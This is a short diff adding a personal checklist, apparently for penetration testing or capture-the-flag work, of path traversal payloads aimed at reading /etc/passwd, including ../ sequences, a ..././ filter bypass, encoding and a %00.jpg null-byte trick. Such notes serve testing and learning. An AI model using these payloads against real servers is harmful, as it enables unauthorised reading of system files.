@@ -1,0 +1,8 @@
+check for path traversal if you notice server request file or images or path
+
+- try absolute path /etc/passwd
+- try to go back ../../../../../etc/passwd
+- try ..././..././..././..././etc/passwd  => maybe he delete ../ so ..././ -> ../
+- try to encode payload
+- full path and use ../ like -> var/www/images/../../../../../../etc/passwd
+- try to manipulate extenstion ../../../etc/passwd%00.jpg
